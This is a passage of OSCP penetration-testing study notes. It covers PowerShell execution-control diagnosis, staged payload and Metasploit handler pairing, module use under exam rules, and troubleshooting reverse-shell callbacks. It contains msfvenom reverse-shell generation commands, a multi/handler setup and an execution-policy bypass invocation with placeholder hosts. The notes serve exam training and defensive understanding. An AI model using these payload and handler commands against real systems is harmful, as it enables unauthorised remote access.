+<p><a href="/oscp/notes/methods/web-exploitation/#web-command">Prove visible or blind operating-system command injection</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-reverse">Connect a Linux reverse shell through an available interpreter</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-windows">Use Windows authenticated access or a PowerShell command channel</a>.</p>
+<p><a id="execution-powershell"></a></p>
+<h2 id="distinguish-powershell-policy-language-mode-and-protected-execution-layers">Distinguish PowerShell policy, language mode and protected execution layers</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#6-powershell-control-layers">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-4">1. Purpose and result</h3>
+<p>An evidence-based diagnosis and compatible execution choice.</p>
+<h3 id="2-recognition-clues-4">2. Recognition clues</h3>
+<p>PowerShell reports scripts disabled, constrained syntax or an execution-control error.</p>
+<h4 id="find-the-clue-from-your-starting-access-4">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Use the failing PowerShell error to inspect execution policy, language mode and actual runtime before choosing an allowed execution form.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Get-ExecutionPolicy -List
+$ExecutionContext.SessionState.LanguageMode
+$PSVersionTable
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Error: script execution is disabled
+LanguageMode: FullLanguage
+Effective policy scope: inspect
+</code></pre>
+<p><strong>Recognize this detail:</strong> A script policy gate is distinct from language-mode restrictions or an antimalware verdict.</p>
+<p><strong>Still missing before method selection:</strong> Identify the actual controlling policy and permitted execution path; encoding/policy arguments do not remove unrelated controls.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The supported allowed operation executes in the verified context: choose it.</td></tr><tr><td>Ruled out in this context</td><td>The required feature is unavailable under the effective enforced policy/language context: reject that implementation.</td></tr><tr><td>Inconclusive</td><td>Unknown policy precedence or no detailed error leaves the exact layer unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-4">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Actual host policy/language context and a supported allowed execution route; required runtime features remain available.</p>
+<h3 id="4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Get-ExecutionPolicy -List
+$ExecutionContext.SessionState.LanguageMode
+$PSVersionTable
+</code></pre>
+<h3 id="5-why-it-works-4">5. Why it works</h3>
+<p>Execution policy, Constrained Language Mode, AMSI and WDAC/AppLocker operate at different boundaries. A command-line policy option does not remove every control or grant privileges.</p>
+<h3 id="6-execute-and-choose-variants-4">6. Execute and choose variants</h3>
+<p>Do not merge these different controls:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Control</th><th>What it changes</th><th>Useful evidence</th></tr></thead><tbody><tr><td>Execution policy</td><td>Conditions for loading/running scripts</td><td><code>Get-ExecutionPolicy -List</code> and exact error</td></tr><tr><td>Language mode</td><td>Available PowerShell language features</td><td><code>$ExecutionContext.SessionState.LanguageMode</code></td></tr><tr><td>AMSI</td><td>Submits supported script/content to antimalware</td><td>Explicit block/error plus Defender/PowerShell events</td></tr><tr><td>AppLocker/WDAC</td><td>Application/script allow policy</td><td>Effective policy and application-control events</td></tr><tr><td>Defender/other AV</td><td>File, memory, behavior and network decisions</td><td>Status, detection history, quarantine/events</td></tr><tr><td>Permissions</td><td>File/process/service/token rights</td><td>Access-denied result under named identity</td></tr></tbody></table>
+<p>Read-only checks:</p>
+<pre><code class="language-powershell">Get-ExecutionPolicy -List
+$ExecutionContext.SessionState.LanguageMode
+
+Get-MpComputerStatus |
+  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,
+    BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureVersion
+
+Get-MpThreatDetection |
+  Select-Object InitialDetectionTime,ThreatID,ActionSuccess,Resources
+
+Get-AppLockerPolicy -Effective -Xml
+
+Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,LevelDisplayName,Message
+
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,Message
+
+Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/MSI and Script' `
+  -MaxEvents 50 -ErrorAction SilentlyContinue |
+  Select-Object TimeCreated,Id,Message
+</code></pre>
+<p>Cmdlets, logs and fields vary by edition, installed modules, permissions and control product. Missing output is inconclusive.</p>
+<p>Execution policy is defense in depth, not a Windows security boundary. A process-scoped policy setting may change script-loading behavior when GPO does not override it:</p>
+<pre><code class="language-cmd">powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\PATH\SCRIPT.ps1
+</code></pre>
+<p>This does not disable AMSI, application control, antimalware, permissions or network controls. Do not change persistent machine/user policy merely to test a payload.</p>
+<h3 id="7-worked-example--hypothetical-4">7. Worked example — hypothetical</h3>
+<p>Observation: an unsigned script is blocked. Test: inspect policy and language mode. Illustrative output: a signed-script rule is active while simple allowed commands work. Interpretation: choose an allowed mechanism without claiming a universal bypass.</p>
+<h3 id="8-verify-the-result-4">8. Verify the result</h3>
+<p>Record the exact failing layer and demonstrate the chosen permitted operation's actual effect.</p>
+<h3 id="9-failure-and-fallback-4">9. Failure and fallback</h3>
+<p>A language-mode error, antimalware block and script policy message require different next decisions.</p>
+<h3 id="10-next-transitions-4">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-controls">Interpret endpoint-control evidence and select a justified alternative</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-windows">Use Windows authenticated access or a PowerShell command channel</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<p><a id="execution-controls"></a></p>
+<h2 id="interpret-endpoint-control-evidence-and-select-a-justified-alternative">Interpret endpoint-control evidence and select a justified alternative</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#7-interpret-control-evidence">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#handle-security-control-evidence-proportionately">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-5">1. Purpose and result</h3>
+<p>A supported failure classification and selected alternative delivery/execution path.</p>
+<h3 id="2-recognition-clues-5">2. Recognition clues</h3>
+<p>An artifact disappears, a process is blocked, or execution is stopped with a policy/security event.</p>
+<h4 id="find-the-clue-from-your-starting-access-5">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Check artifact persistence/hash and, when permitted, the matching security/policy event before labelling a missing effect as endpoint detection.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-powershell">Test-Path .\FILE
+Get-FileHash .\FILE -Algorithm SHA256 -ErrorAction SilentlyContinue
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">After transfer: file present with expected hash
+Before launch: file absent
+Matching security event: inspect
+</code></pre>
+<p><strong>Recognize this detail:</strong> A disappearing artifact narrows the boundary but does not identify a particular control without corroboration.</p>
+<p><strong>Still missing before method selection:</strong> Correlate file/process/event identity, time and exact action before selecting an alternative consumer.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Specific control evidence identifies the block and another permitted compatible method exists: select that alternative.</td></tr><tr><td>Ruled out in this context</td><td>The file is intact and the actual error is wrong architecture: reject the detection hypothesis.</td></tr><tr><td>Inconclusive</td><td>No event visibility leaves the cause possible/inconclusive; do not invent an AMSI/AV diagnosis.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-5">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Observable evidence at the relevant boundary and a compatible alternative whose own prerequisites hold.</p>
+<h3 id="4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</h3>
+<pre><code class="language-powershell">Test-Path .\FILE
+Get-FileHash .\FILE -Algorithm SHA256 -ErrorAction SilentlyContinue
+</code></pre>
+<h3 id="5-why-it-works-5">5. Why it works</h3>
+<p>Disappearance, access denial and a missing callback are not interchangeable proof of antivirus detection. Hash, file persistence, process creation and available events narrow the failed boundary.</p>
+<h3 id="6-execute-and-choose-variants-5">6. Execute and choose variants</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Most useful next action</th></tr></thead><tbody><tr><td>Transferred hash differs</td><td>Repair transfer/encoding before execution</td></tr><tr><td>File arrives then vanishes</td><td>Inspect quarantine/detection events and resource path</td></tr><tr><td>File remains; process creation denied</td><td>Inspect AppLocker/WDAC, permissions and parent process</td></tr><tr><td>Script-loading policy error</td><td>Inspect scope/precedence; use an authorized process-only invocation if applicable</td></tr><tr><td>Explicit AMSI/content block</td><td>Treat content/control as confirmed; encoding alone is not a supported conclusion</td></tr><tr><td>Process starts then exits</td><td>Capture exit/error, dependency and architecture evidence</td></tr><tr><td>Process remains; no connection</td><td>Test target egress, LHOST and listener</td></tr><tr><td>TCP handshake then close</td><td>Handler/payload mismatch, stage failure, crash or control interruption</td></tr></tbody></table>
+<p>Modern protection can inspect files, scripts after decoding, process memory, behavior and network activity. Therefore:</p>
+<ul>
+<li>changing a filename does not imply a new payload;</li>
+<li>Base64 does not imply concealment from AMSI;</li>
+<li>an in-memory technique is not automatically invisible;</li>
+<li>an encoder is primarily useful for transport/bad-character constraints, not guaranteed AV bypass;</li>
+<li>a clean third-party scanner result does not prove execution on the target and may disclose a private sample.</li>
+</ul>
+<p>Prefer the least complex route already supported by evidence: a direct command, native interpreter, authenticated management service or simple command shell may meet the objective without a custom binary. Deep shellcode development, process-injection implementation and generalized AV-bypass recipes are outside this speedrun.</p>
+<p>Windows Defender status, when the current identity can query it:</p>
+<pre><code class="language-powershell">Get-MpComputerStatus |
+  Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled
+</code></pre>
+<p>Do not label every failure “AV.” Differentiate:</p>
+<ul>
+<li>file never arrived or hashes differ;</li>
+<li>file arrived and disappeared/quarantined;</li>
+<li>process creation was denied;</li>
+<li>script content was blocked;</li>
+<li>process started and exited/crashed;</li>
+<li>callback was blocked after execution;</li>
+<li>application-control or language-mode restrictions;</li>
+<li>ordinary format, architecture, permission or dependency errors.</li>
+</ul>
+<p>Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit.</p>
+<p>For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">payload execution obstacles</a>.</p>
+<h3 id="7-worked-example--hypothetical-5">7. Worked example — hypothetical</h3>
+<p>Observation: the transferred file vanishes before it is launched. Test: verify transfer integrity and available control events. Illustrative output: quarantine evidence names the file. Interpretation: execution has not been demonstrated; choose a justified allowed approach rather than changing listener syntax.</p>
+<h3 id="8-verify-the-result-5">8. Verify the result</h3>
+<p>Tie the observed block to the artifact/process and preserve the exact error/event context privately.</p>
+<h3 id="9-failure-and-fallback-5">9. Failure and fallback</h3>
+<p>No event visibility leaves the diagnosis inconclusive. Deep control-bypass development is not added through troubleshooting.</p>
+<h3 id="10-next-transitions-5">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-format">Match an artifact to its executable consumer and runtime</a>; <a href="/oscp/notes/methods/public-exploits/#exploit-web">Repair a web PoC using the real HTTP transaction</a>; <a href="/oscp/notes/methods/lateral-movement/#move-winrm">Use WinRM, WinRS or PowerShell remoting</a>.</p>
+<p><a id="execution-handler"></a></p>
+<h2 id="pair-staged-payloads-with-the-correct-handler-and-session-lifecycle">Pair staged payloads with the correct handler and session lifecycle</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#8-generate-only-after-selecting-the-context">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#9-multihandler-and-session-lifecycle">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-6">1. Purpose and result</h3>
+<p>A verified intended session rather than merely a connected socket.</p>
+<h3 id="2-recognition-clues-6">2. Recognition clues</h3>
+<p>A payload connects without a session, or a handler/session exits unexpectedly.</p>
+<h4 id="find-the-clue-from-your-starting-access-6">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> In the selected handler console compare the exact payload/options with the generated artifact and inspect job/session state.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-text">show options
+jobs
+sessions
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Artifact payload: staged PAYLOAD_NAME
+Listener: raw Netcat
+Sessions: none
+</code></pre>
+<p><strong>Recognize this detail:</strong> The first-stage protocol may be reaching a receiver that cannot provide the remaining stage.</p>
+<p><strong>Still missing before method selection:</strong> Verify exact payload/architecture/transport pair, listener bind, stage route and lifecycle.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A matching supported handler completes the intended session and identity is checked: use it.</td></tr><tr><td>Ruled out in this context</td><td>The handler is configured for another payload family: reject that pairing.</td></tr><tr><td>Inconclusive</td><td>A connection without stage/command evidence leaves a usable session unproved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#payload-generate">Generate a payload matching OS, process, format and handler</a>.</p>
+<h3 id="3-prerequisites-6">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Exact payload/architecture/transport pairing, correct listener binding, reachable staging path and suitable job/session configuration.</p>
+<h3 id="4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</h3>
+<pre><code class="language-text">show options
+jobs
+sessions
+</code></pre>
+<h3 id="5-why-it-works-6">5. Why it works</h3>
+<p>A handler speaks the payload's protocol. Staged payloads need the rest of their payload after the first connection; jobs, sessions and listener lifecycle are different framework state.</p>
+<h3 id="6-execute-and-choose-variants-6">6. Execute and choose variants</h3>
+<pre><code class="language-bash">msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86'
+msfvenom --list formats
+msfvenom -p PAYLOAD_NAME --list-options
+</code></pre>
+<p>Baseline stageless command shells:</p>
+<pre><code class="language-bash">msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f elf -o shell.elf
+
+msfvenom -p windows/x64/shell_reverse_tcp \
+  LHOST=LHOST LPORT=LPORT \
+  -f exe -o shell.exe
+
+file shell.elf shell.exe
+sha256sum shell.elf shell.exe
+</code></pre>
+<p>Existing reviewed PoC with documented byte restrictions:</p>
+<pre><code class="language-bash">msfvenom -p PAYLOAD_NAME \
+  LHOST=LHOST LPORT=LPORT \
+  EXITFUNC=thread \
+  -f FORMAT -v VARIABLE \
+  -b 'BAD_CHARACTERS' -s MAX_SPACE
+</code></pre>
+<p>Use <code>EXITFUNC</code> only when the exploit/consumer requires that termination behavior. Never invent bad characters or size limits.</p>
+<p>Staging distinction:</p>
+<pre><code class="language-text">windows/x64/shell_reverse_tcp  single/stageless
+windows/x64/shell/reverse_tcp  staged
+</code></pre>
+<p>A staged payload first connects and asks its handler for the larger stage. A raw Netcat listener cannot supply that protocol.</p>
+<p>Matching handler:</p>
+<pre><code class="language-text">msfconsole -q
+use exploit/multi/handler
+set PAYLOAD PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+set ExitOnSession false
+show options
+run -j
+</code></pre>
+<p>Manage the resulting job/session deliberately:</p>
+<pre><code class="language-text">jobs -l
+sessions -l
+sessions -i SESSION_ID
+background
+sessions -k SESSION_ID
+jobs -k JOB_ID
+</code></pre>
+<p><code>ExitOnSession false</code> keeps the handler available after a session opens. <code>run -j</code> backgrounds the handler. A session ID is local to that framework instance; record the target, identity, payload and listener rather than relying on the number alone.</p>
+<p>Handler failure cues:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Output</th><th>Interpretation</th></tr></thead><tbody><tr><td>Handler never binds</td><td>Bad local address, occupied port or privilege issue</td></tr><tr><td>Raw listener receives connection; framework does not</td><td>Different port/interface or payload transport</td></tr><tr><td>Handler receives connection but no session</td><td>Exact payload/stager mismatch, stage blocked or crash</td></tr><tr><td>Session opens then dies</td><td>Parent exits, payload exit behavior, route/control or process crash</td></tr><tr><td>Session opens as unexpected architecture/type</td><td>Default payload or target was not explicitly selected</td></tr></tbody></table>
+<h3 id="7-worked-example--hypothetical-6">7. Worked example — hypothetical</h3>
+<p>Observation: a staged payload reaches a raw TCP listener. Test: match the exact payload in its supported handler. Illustrative output: staging completes and a session is listed. Interpretation: verify the target and identity through it.</p>
+<h3 id="8-verify-the-result-6">8. Verify the result</h3>
+<p>Verify the resulting session's host/identity and keep the listener/payload relationship explicit.</p>
+<h3 id="9-failure-and-fallback-6">9. Failure and fallback</h3>
+<p>Wrong payload family, second-stage filtering, listener bind or handler lifecycle can explain the same superficial no-session symptom.</p>
+<h3 id="10-next-transitions-6">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>; <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>; <a href="/oscp/notes/methods/sessions-transfers/#payload-generate">Generate a payload matching OS, process, format and handler</a>.</p>
+<p><a id="execution-framework"></a></p>
+<h2 id="use-a-framework-module-with-explicit-target-and-feature-constraints">Use a framework module with explicit target and feature constraints</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#10-metasploit-module-workflow-and-exam-boundary">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-7">1. Purpose and result</h3>
+<p>An independently verified module effect and a tracked framework context.</p>
+<h3 id="2-recognition-clues-7">2. Recognition clues</h3>
+<p>A reviewed module fits a verified exploit prerequisite set.</p>
+<h4 id="find-the-clue-from-your-starting-access-7">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Read the selected module's information/targets/options and compare them with independently gathered component evidence before any target check/run.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-text">info
+show options
+show targets
+show payloads
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Module target: BUILD_AND_PLATFORM
+Required option: authenticated ROLE
+Observed target: role/feature not yet verified
+</code></pre>
+<p><strong>Recognize this detail:</strong> The module describes conditions to investigate; its existence is not a vulnerability result.</p>
+<p><strong>Still missing before method selection:</strong> Verify exact target/configuration, access, payload/route and current feature restrictions before selecting it.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The module conditions and intended effect are independently established: use it within the permitted context.</td></tr><tr><td>Ruled out in this context</td><td>The required feature/target is absent: reject this module candidate.</td></tr><tr><td>Inconclusive</td><td>A banner match without role/configuration evidence is inconclusive; do not use a check to replace prerequisite reasoning.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/public-exploits/#exploit-select">Match a public exploit to the actual component and configuration</a>.</p>
+<h3 id="3-prerequisites-7">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> Correct module/target/options, accepted payload/delivery route and the applicable current exam feature/target restrictions.</p>
+<h3 id="4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</h3>
+<pre><code class="language-text">info
+show options
+show targets
+show payloads
+</code></pre>
+<h3 id="5-why-it-works-7">5. Why it works</h3>
+<p>Module completion or a vulnerability check is not a verified foothold. Module, handler and payload choices have different behavior and policy treatment; keep their roles explicit.</p>
+<h3 id="6-execute-and-choose-variants-7">6. Execute and choose variants</h3>
+<p>Manual module inspection:</p>
+<pre><code class="language-text">search type:exploit cve:CVE_ID
+info MODULE_PATH
+use MODULE_PATH
+show options
+show advanced
+show targets
+show payloads
+set RHOSTS TARGET
+set RPORT PORT
+set TARGET TARGET_ID
+set PAYLOAD PAYLOAD_NAME
+set LHOST LHOST
+set LPORT LPORT
+show missing
+run
+</code></pre>
+<p>Interpretation rules:</p>
+<ul>
+<li>module rank describes expected exploit stability, not target vulnerability;</li>
+<li><code>check</code> is an active module operation and does not prove exploitability when unsupported or inconclusive;</li>
+<li>target IDs, default payloads and options vary by module/version;</li>
+<li>automatic target selection is still an assumption to verify;</li>
+<li>a module's success message is weaker than a verified session, host and identity;</li>
+<li><code>setg</code> persists values across modules and can silently aim later work at the wrong host; prefer local <code>set</code> unless global state is intentionally tracked.</li>
+</ul>
+<p>Current OSCP+ restriction:</p>
+<ul>
+<li><code>msfvenom</code> and <code>exploit/multi/handler</code> may be used against all targets, except that a Meterpreter payload remains subject to the one-target limit;</li>
+<li>any Metasploit Auxiliary, Exploit or Post module—or Meterpreter payload—locks the selection to one target, even if <code>check</code> or the attack fails;</li>
+<li>Metasploit pivoting is prohibited;</li>
+<li>automatic exploitation tools are prohibited.</li>
+</ul>
+<p>Use manual/source-reviewed exploitation as the reusable baseline. Decide on the restricted Metasploit target deliberately and record that decision before using a restricted module or Meterpreter.</p>
+<h3 id="7-worked-example--hypothetical-7">7. Worked example — hypothetical</h3>
+<p>Observation: a module reports completion without a session. Test: inspect its expected effect, actual target selection and staged route. Illustrative output: execution occurred but the callback path is missing. Interpretation: retain execution proof and diagnose transport.</p>
+<h3 id="8-verify-the-result-7">8. Verify the result</h3>
+<p>Verify destination effect and identity outside the module's status message.</p>
+<h3 id="9-failure-and-fallback-7">9. Failure and fallback</h3>
+<p>The official guide limits module/Meterpreter use to one target, with stated handler/msfvenom exceptions; even a failed check can commit the choice. Recheck the linked guide before choosing the feature.</p>
+<h3 id="10-next-transitions-7">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>; <a href="/oscp/notes/methods/execution/#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>.</p>
+<p><a id="execution-callback"></a></p>
+<h2 id="diagnose-connection-direction-listener-and-session-failures-in-order">Diagnose connection direction, listener and session failures in order</h2>
+<p><strong>Blocks:</strong> 14; used throughout 4, 6, 7 and 12–13. <a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/#diagnose-a-missing-callback-in-order">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#2-fast-diagnostic-order">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#11-worked-diagnostic-paths">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/#1-preserve-the-execution-chain">Operational procedure</a> | <a href="/oscp/cheatsheets/payload-execution/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-8">1. Purpose and result</h3>
+<p>The first failed delivery/execution/transport/session boundary and a targeted next test.</p>
+<h3 id="2-recognition-clues-8">2. Recognition clues</h3>
+<p>Command execution or payload delivery exists but the expected usable channel does not.</p>
+<h4 id="find-the-clue-from-your-starting-access-8">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Return to the last observed execution proof, inspect listener bind/address and compare actual packet arrival with the expected direction.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ss -lnt
+ip route get TARGET
+sudo tcpdump -ni INTERFACE tcp port PORT
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Execution proof: confirmed
+Listener: bound on EXPECTED_PORT
+Packet observation: no target SYN
+</code></pre>
+<p><strong>Recognize this detail:</strong> The channel failed before an observed connection; investigate trigger/advertised route/egress before terminal repair.</p>
+<p><strong>Still missing before method selection:</strong> Name the process initiating the connection and its actual destination address/port. Check the listener bind and each route/pivot leg; if delivery works but no callback arrives, repair the return path before changing payload bytes.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The correct packet/session path works and identity is verified: use the resulting channel.</td></tr><tr><td>Ruled out in this context</td><td>The advertised address is unreachable and not forwarded: reject that callback topology.</td></tr><tr><td>Inconclusive</td><td>No packets without prior execution proof cannot distinguish a failed trigger from network failure.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites-8">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A recorded delivery/execution chain with the expected consumer and effect. <strong>Required conditions:</strong> A recorded first execution proof, correct advertised route, active compatible listener and observable connection evidence.</p>
+<h3 id="4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ss -lnt
+ip route get TARGET
+sudo tcpdump -ni INTERFACE tcp port PORT
+</code></pre>
+<h3 id="5-why-it-works-8">5. Why it works</h3>
+<p>No packets, rejected packets, accepted connection and unstable shell are different states. Reverse callbacks and target downloads need routes independent of the initiating exploit.</p>
+<h3 id="6-execute-and-choose-variants-8">6. Execute and choose variants</h3>
+<ol>
+<li><strong>Delivery:</strong> prove the request/file/argument reaches the intended consumer.</li>
+<li><strong>Execution:</strong> prove <code>id</code>/<code>whoami</code>, hostname or a bounded side effect in the exact context.</li>
+<li><strong>Parser:</strong> verify quoting, encoding, interpreter, working directory and length.</li>
+<li><strong>Payload:</strong> confirm OS, architecture, format, staged/stageless type and dependencies.</li>
+<li><strong>Listener:</strong> start it first and verify the bound address and port.</li>
+<li><strong>Route:</strong> test target-to-listener reachability from the execution context.</li>
+<li><strong>Security control:</strong> use concrete errors, quarantine, logs or process behavior.</li>
+<li><strong>Session:</strong> repair TTY, buffering, encoding and job control after connection.</li>
+</ol>
+<p>Target-side route checks where available:</p>
+<pre><code class="language-bash">nc -vz LHOST LPORT
+curl -v --connect-timeout 5 http://LHOST:LPORT/
+</code></pre>
+<pre><code class="language-powershell">Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed
+</code></pre>
+<p>Observe Kali while triggering:</p>
+<pre><code class="language-bash">sudo tcpdump -ni any tcp port LPORT
+</code></pre>
+<p>Interpretation:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Observation</th><th>Next decision</th></tr></thead><tbody><tr><td>No SYN reaches Kali</td><td>Wrong execution, LHOST, route, egress or earlier parser layer</td></tr><tr><td>SYN arrives; no listener response</td><td>Wrong bind/interface/port or local firewall</td></tr><tr><td>TCP handshake then immediate close</td><td>Payload/handler mismatch, crash or security control</td></tr><tr><td>Connection stays but no commands</td><td>Staged/raw mismatch, buffering or I/O/session issue</td></tr></tbody></table>
+<ol>
+<li>Reproduce a harmless direct command in the exact vulnerable or user context.</li>
+<li>Confirm file/request integrity, final path and consumer.</li>
+<li>Identify every parser, interpreter and loader.</li>
+<li>Match target OS, process architecture, artifact format and runtime dependencies.</li>
